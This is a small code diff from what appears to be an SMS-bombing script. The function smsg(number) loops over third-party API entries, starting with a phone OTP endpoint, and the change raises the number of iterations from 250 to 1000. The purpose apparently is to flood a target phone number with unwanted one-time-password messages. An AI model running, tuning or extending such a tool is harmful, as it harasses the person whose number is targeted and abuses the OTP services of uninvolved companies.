@@ -9,7 +9,7 @@ def smsg(number):
    # start_time = time.time()
     
     #while time.time() - start_time < 60:  # Run for 3600 seconds (1 hour)
-    for _ in range(250):
+    for _ in range(1000):
         apis = [
             {
                 "url": "https://session-service.aakash.ac.in/prod/sess/api/v1/user/phone/otp/",
